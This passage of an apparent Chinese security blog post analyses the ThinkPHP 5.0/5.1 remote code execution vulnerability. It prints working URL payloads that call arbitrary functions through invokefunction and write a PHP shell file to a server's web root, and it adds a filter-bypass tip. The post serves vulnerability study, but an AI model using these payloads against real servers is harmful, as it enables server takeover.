+<p>便可以在网站根目录写入任意恶意文件，从而达到控制目标服务器的目的，可以调用进行恶意操作的类比较多。</p>
+<p>对于Thinkphp5.0版本的，其路由控制器实现原理是一样的，只是各种调用方式和函数名不太相同，这里不详细分析，漏洞利用时调用的方法不一样，通过查找可以利用app类中的invokeFunction方法：<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-2a47a46b95e5af6b.png" alt></p>
+<p>通过实例化ReflectionFunction类，调用function函数，由于变量$var为数组，所以可以构造payload：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-b7e6f442b42a7dac.png" alt></p>
+<p>通过构造payload:</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=file_</span>put_contents&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=shell.php&amp;vars[<span class="string">1</span>][<span class="symbol">1</span>]=<span class="xml"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+<p>便可以达到任意写的目的：<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-28e6c65aa5f32ad0.png" alt></p>
+<p>同5.1版本一样，其parseUrlPath函数在处理$url时也进行了替换处理：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$url</span> = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, <span class="symbol">$url</span>);</span><br></pre></td></tr></table></figure>
+<p>所以payload中的’/’也可以利用’|’进行替换。该漏洞的利用方法不唯一，针对Thinkphp5.*的不同版本可以寻找不同的类进行调用。</p>
+<p><strong>漏洞分析仅用于学习！！！一切实际攻击利用行为概不负责。</strong></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+              <a href="/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/" rel="prev" title="鹏城杯决赛-web源码分析&稳定自动化上分之路">
+      <i class="fa fa-chevron-left"></i> 鹏城杯决赛-web源码分析&稳定自动化上分之路
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="Seacms 6.54 & 6.55 任意代码执行漏洞分析">
+      Seacms 6.54 & 6.55 任意代码执行漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞利用方式"><span class="nav-number">1.</span> <span class="nav-text">0x01 漏洞利用方式</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cyc1e"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Cyc1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cyc1eC" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cyc1eC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9c3ca1ca4784" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9c3ca1ca4784" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyc1e</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">176k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
